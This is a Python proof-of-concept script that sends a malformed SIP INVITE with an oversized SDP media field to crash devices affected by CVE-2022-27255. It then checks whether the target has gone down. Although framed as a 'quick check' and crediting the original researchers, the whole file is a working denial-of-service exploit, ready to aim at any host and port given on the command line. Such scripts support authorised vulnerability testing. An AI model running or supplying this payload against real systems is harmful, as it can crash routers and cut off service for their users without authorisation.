import socket
import telnetlib
from telnetlib import Telnet
from time import sleep
import sys

# CVE-2022-27255 quick check.
# Reference PoC: https://github.com/infobyte/cve-2022-27255/blob/main/exploits_nexxt/poc_crash.py
# Original authors: Martin Tartarelli and Octavio Gianatiempo.


if (len(sys.argv) == 3):
    options = {
        "server": sys.argv[1],
        "port": int(sys.argv[2])
    }
    payload = b""
    payload += b"a" * 256
    sdp = b"""v=0\x0d
    o=jdoe 2890844526 2890842807 IN IP4 10.47.16.5\x0d
    c=IN IP4 224.2.17.12/127\x0d
    t=2873397496 2873404696\x0d
    a=recvonly\x0d
    m=audio 49170 """ + payload + b"""\x0d\x0a"""
    sip = f"""INVITE sip:x  SIP/2.0\x0d
    Content-Length: {len(sdp)} \r\n\r\n""".encode() + sdp
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.bind(('', 5060))
    print('Establishing connection to '+options["server"]+':'+str(options["port"]))
    s.connect((options["server"], options["port"]))
    sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result1 = sock1.connect_ex((options["server"],options["port"]))
    if result1 == 0:
        print('Connection established!')
        print('Sending exploit...')
        sent=s.send(sip)
        print( 'Exploit sent! Checking if telnet still available')
        sleep(5)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((options["server"],options["port"]))
        if result == 0:
            print("Target not explotailable, telnet still available")
        else:
            print ("Target crashed. Target vulnerable")
    else:
        print("Telnet not available")
    sock1.close()
else:
    print("Usage: "+sys.argv[0]+" <server ip> <port>")

